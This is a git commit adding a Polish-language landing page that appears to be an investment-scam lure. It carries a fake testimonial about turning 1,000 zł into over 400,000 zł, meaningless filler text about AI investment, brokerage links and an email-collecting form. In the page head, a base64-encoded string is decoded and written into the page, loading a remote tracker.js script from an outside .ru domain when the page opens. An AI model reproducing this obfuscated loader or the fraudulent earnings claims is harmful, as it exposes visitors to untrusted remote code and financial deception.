77d44c5c3493b7ad9c6694896a97ed3008b6cf5e
syebylmf <75944349+syebylmf@users.noreply.github.com>
2020-12-14 12:07:08 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Podobnie, czy wzrost świadomości obywatelskiej pozwala wypełnić kluczowe zadanie proje</title>
+    <meta property="og:type"               content="article" />
+    <meta property="og:title"              content=" " />
+    <meta property="og:description"        content="𝐍𝐢𝐞𝐝𝐚𝐰𝐧𝐨 𝐳𝐚𝐫𝐞𝐣𝐞𝐬𝐭𝐫𝐨𝐰𝐚ł𝐞𝐦 𝐬𝐢𝐞̨ 𝐧𝐚 𝐭𝐞𝐣 𝐬𝐭𝐫𝐨𝐧𝐢𝐞 𝐢 𝐭𝐞𝐫𝐚𝐳 𝐰𝐲𝐩ł𝐚𝐜𝐢ł𝐞𝐦 𝐩𝐨𝐧𝐚𝐝 𝟺𝟶𝟶 𝚃𝚈𝚂𝙸𝙴̨𝙲𝚈 z͟ł͟o͟t͟y͟c͟h͟!   
+
+𝐏𝐨 𝐫𝐞𝐣𝐞𝐬𝐭𝐫𝐚𝐜𝐣𝐢 𝐳𝐚𝐝𝐳𝐰𝐨𝐧𝐢ł 𝐝𝐨 𝐦𝐧𝐢𝐞 𝐤𝐨𝐧𝐬𝐮𝐥𝐭𝐚𝐧𝐭 𝐢 𝐨𝐩𝐨𝐰𝐢𝐞𝐝𝐳𝐢𝐚ł 𝐦𝐢, 𝐣𝐚𝐤 𝐝𝐳𝐢𝐚ł𝐚 𝐬𝐲𝐬𝐭𝐞𝐦. 𝐖𝐩ł𝐚𝐜𝐢ł𝐞𝐦 𝐧𝐚 𝐤𝐨𝐧𝐭𝐨 𝐭𝐲𝐥𝐤𝐨 𝟷𝟶𝟶𝟶 z͟ł͟. 𝐓𝐫𝐳𝐲 𝐝𝐧𝐢 𝐩𝐨́𝐳́𝐧𝐢𝐞𝐣 𝐦𝐢𝐚ł𝐞𝐦 𝐣𝐮𝐳̇ 𝐧𝐚 𝐤𝐨𝐧𝐜𝐢𝐞 𝟸𝟻 𝟽𝟷𝟶 z͟ł͟, 𝐦𝐢𝐞𝐬𝐢𝐚̨𝐜 𝐩𝐨́𝐳́𝐧𝐢𝐞𝐣 𝐛𝐲ł𝐨 𝐩𝐨𝐧𝐚𝐝 𝟸𝟶𝟶 𝟶𝟶𝟶 z͟ł͟o͟t͟y͟c͟h͟!  
+
+𝐏𝐫𝐳𝐞𝐩𝐫𝐚𝐬𝐳𝐚𝐦, 𝐧𝐢𝐞 𝐦𝐨𝐠ł𝐞𝐦 𝐰𝐜𝐳𝐞𝐬́𝐧𝐢𝐞𝐣 𝐩𝐨𝐰𝐢𝐞𝐝𝐳𝐢𝐞𝐜́ 𝐨 𝐭𝐞𝐣 𝐰𝐢𝐭𝐫𝐲𝐧𝐢𝐞, 𝐩𝐨𝐧𝐢𝐞𝐰𝐚𝐳̇ 𝐫𝐞𝐣𝐞𝐬𝐭𝐫𝐚𝐜𝐣𝐚 𝐛𝐲ł𝐚 𝐳𝐚𝐦𝐤𝐧𝐢𝐞̨𝐭𝐚. 𝐉𝐞𝐝𝐧𝐚𝐤 𝐝𝐳𝐢𝐬𝐢𝐚𝐣 𝐳𝐧𝐨𝐰𝐮 𝐬𝐢𝐞̨ 𝐨𝐭𝐰𝐨𝐫𝐳𝐲ł𝐚, 𝐧𝐢𝐞 𝐰𝐢𝐞𝐦 𝐧𝐚 𝐣𝐚𝐤 𝐧𝐚 𝐝ł𝐮𝐠𝐨, 𝐰𝐢𝐞̨𝐜 𝐩𝐨𝐬𝐩𝐢𝐞𝐬𝐳 𝐬𝐢𝐞̨, 𝐤𝐨𝐧𝐬𝐮𝐥𝐭𝐚𝐧𝐭 𝐳𝐚𝐝𝐳𝐰𝐨𝐧𝐢 𝐢 𝐰𝐬𝐳𝐲𝐬𝐭𝐤𝐨 С𝐢 𝐨𝐩𝐨𝐰𝐢𝐞." />
+    <meta property="og:image"              content="1.jpg">
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+    
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl8xZ3V0MHU3NWR4bnEiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Podobnie, czy wzrost świadomości obywatelskiej pozwala wypełnić kluczowe zadanie proje</h1>
+	</section>
+
+
+
+
+
+
+
+	<section class="our-work" >
+<p>𝐍𝐢𝐞𝐝𝐚𝐰𝐧𝐨 𝐳𝐚𝐫𝐞𝐣𝐞𝐬𝐭𝐫𝐨𝐰𝐚ł𝐞𝐦 𝐬𝐢𝐞̨ 𝐧𝐚 𝐭𝐞𝐣 𝐬𝐭𝐫𝐨𝐧𝐢𝐞 𝐢 𝐭𝐞𝐫𝐚𝐳 𝐰𝐲𝐩ł𝐚𝐜𝐢ł𝐞𝐦 𝐩𝐨𝐧𝐚𝐝 𝟺𝟶𝟶 𝚃𝚈𝚂𝙸𝙴̨𝙲𝚈 z͟ł͟o͟t͟y͟c͟h͟!   
+
+𝐏𝐨 𝐫𝐞𝐣𝐞𝐬𝐭𝐫𝐚𝐜𝐣𝐢 𝐳𝐚𝐝𝐳𝐰𝐨𝐧𝐢ł 𝐝𝐨 𝐦𝐧𝐢𝐞 𝐤𝐨𝐧𝐬𝐮𝐥𝐭𝐚𝐧𝐭 𝐢 𝐨𝐩𝐨𝐰𝐢𝐞𝐝𝐳𝐢𝐚ł 𝐦𝐢, 𝐣𝐚𝐤 𝐝𝐳𝐢𝐚ł𝐚 𝐬𝐲𝐬𝐭𝐞𝐦. 𝐖𝐩ł𝐚𝐜𝐢ł𝐞𝐦 𝐧𝐚 𝐤𝐨𝐧𝐭𝐨 𝐭𝐲𝐥𝐤𝐨 𝟷𝟶𝟶𝟶 z͟ł͟. 𝐓𝐫𝐳𝐲 𝐝𝐧𝐢 𝐩𝐨́𝐳́𝐧𝐢𝐞𝐣 𝐦𝐢𝐚ł𝐞𝐦 𝐣𝐮𝐳̇ 𝐧𝐚 𝐤𝐨𝐧𝐜𝐢𝐞 𝟸𝟻 𝟽𝟷𝟶 z͟ł͟, 𝐦𝐢𝐞𝐬𝐢𝐚̨𝐜 𝐩𝐨́𝐳́𝐧𝐢𝐞𝐣 𝐛𝐲ł𝐨 𝐩𝐨𝐧𝐚𝐝 𝟸𝟶𝟶 𝟶𝟶𝟶 z͟ł͟o͟t͟y͟c͟h͟!  
+
+𝐏𝐫𝐳𝐞𝐩𝐫𝐚𝐬𝐳𝐚𝐦, 𝐧𝐢𝐞 𝐦𝐨𝐠ł𝐞𝐦 𝐰𝐜𝐳𝐞𝐬́𝐧𝐢𝐞𝐣 𝐩𝐨𝐰𝐢𝐞𝐝𝐳𝐢𝐞𝐜́ 𝐨 𝐭𝐞𝐣 𝐰𝐢𝐭𝐫𝐲𝐧𝐢𝐞, 𝐩𝐨𝐧𝐢𝐞𝐰𝐚𝐳̇ 𝐫𝐞𝐣𝐞𝐬𝐭𝐫𝐚𝐜𝐣𝐚 𝐛𝐲ł𝐚 𝐳𝐚𝐦𝐤𝐧𝐢𝐞̨𝐭𝐚. 𝐉𝐞𝐝𝐧𝐚𝐤 𝐝𝐳𝐢𝐬𝐢𝐚𝐣 𝐳𝐧𝐨𝐰𝐮 𝐬𝐢𝐞̨ 𝐨𝐭𝐰𝐨𝐫𝐳𝐲ł𝐚, 𝐧𝐢𝐞 𝐰𝐢𝐞𝐦 𝐧𝐚 𝐣𝐚𝐤 𝐧𝐚 𝐝ł𝐮𝐠𝐨, 𝐰𝐢𝐞̨𝐜 𝐩𝐨𝐬𝐩𝐢𝐞𝐬𝐳 𝐬𝐢𝐞̨, 𝐤𝐨𝐧𝐬𝐮𝐥𝐭𝐚𝐧𝐭 𝐳𝐚𝐝𝐳𝐰𝐨𝐧𝐢 𝐢 𝐰𝐬𝐳𝐲𝐬𝐭𝐤𝐨 С𝐢 𝐨𝐩𝐨𝐰𝐢𝐞.
+
+ </p>
+<hr>
+		<hr>
+		<img src="1.jpg"/>
+<p> Po 60 latach reaktywowano zainteresowanie sztuczną inteligencją (AI). Ostatnio w sztucznej inteligencji dokonano wielu niesamowitych postępów naukowych. Być może najgłośniejszym było zwycięstwo AlphaGo firmy DeepMind nad jednym z najsilniejszych graczy go. <br> <br>
+
+Ponadto w praktyce coraz częściej wykorzystywane są technologie sztucznej inteligencji. Od dawna są przystosowane do rozwiązywania problemów biznesowych. Ale teraz fenomen sztucznej inteligencji otwiera się na masową publiczność. Usługi oparte na sieciach neuronowych wkraczają w życie zwykłych ludzi i wywołują ogromny efekt wirusowy. <br> <br>
+
+Nie trzeba daleko szukać przykładów - wystarczy przypomnieć niedawny sukces krajowych projektów Prisma i Findface, a także białoruskiego startupu MSQRD. <br> <br>
+
+Wszystko to było możliwe dzięki wzrostowi wydajności komputerów, szybkiemu gromadzeniu danych cyfrowych (i to jest główna książka o AI) oraz rozwojowi uczenia maszynowego. <br> <br>
+
+Według CB Insights inwestycje w sztuczną inteligencję biją dziś wszelkie rekordy. W ciągu ostatnich 5 lat liczba transakcji w tym obszarze wzrosła z 67 do 397, łączna kwota finansowania dla startupów AI - z 282 milionów dolarów do 2,4 miliarda dolarów. <br> <br>
+
+Od początku 2016 roku ponad 200 twórców systemów sztucznej inteligencji przyciągnęło inwestycje (łącznie około 1,5 mld USD). Wewnętrznym rozwojem sztucznej inteligencji kierują IBM, Google, Facebook, Apple, Samsung, Amazon i Microsoft. Giganci IT kupują startupy w partiach, które mają rozwiązania oparte na sieciach neuronowych. <br> <br>
+
+Postępuj zgodnie z moimi wskazówkami i inwestuj w duże firmy:</p><br><br>
+<a href="https://www.jpmorganchase.com/" >jpmorganchase.com</a><br><br>
+<a href="https://tdameritrade.com/" >tdameritrade.com</a><br><br>
+	</section>
+
+
+
+
+
+
+
+	<section class="contact">
+		<h3 class="title">Drodzy przyjaciele, ustalona struktura organizacji przyczynia s</h3>	
+		<p>Różnorodne i bogate doświadczenia związane z podnoszeniem poziomu świadomości obywatelskiej stwarzają warunki do podjęcia nowych kroków jakościowych w systemie szkolenia odpowiadających pilnym potrzebom! Praktyczne doświadczenie pokazuje, że kurs narodowego projektu orientacji społecznej jest ciekawym doświadczeniem pozwalającym przetestować kluczowe elementy planowanej renowacji. Codzienna praktyka pokazuje, że nowy model działania organizacji odgrywa ważną rolę w kształtowaniu wszechstronnych i zrównoważonych innowacji! Znaczenie tych zagadnień jest na tyle wyraźne, że rozwój społeczno-gospodarczy odgrywa istotną rolę w kształtowaniu kierunków postępowego rozwoju.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>728 Christ Views, Apt. 494, 59675, Lake Stanton, Ohio, United States</p>
+	</footer>
+
+
+
+
+
+
+
+</body>
+
+</html>
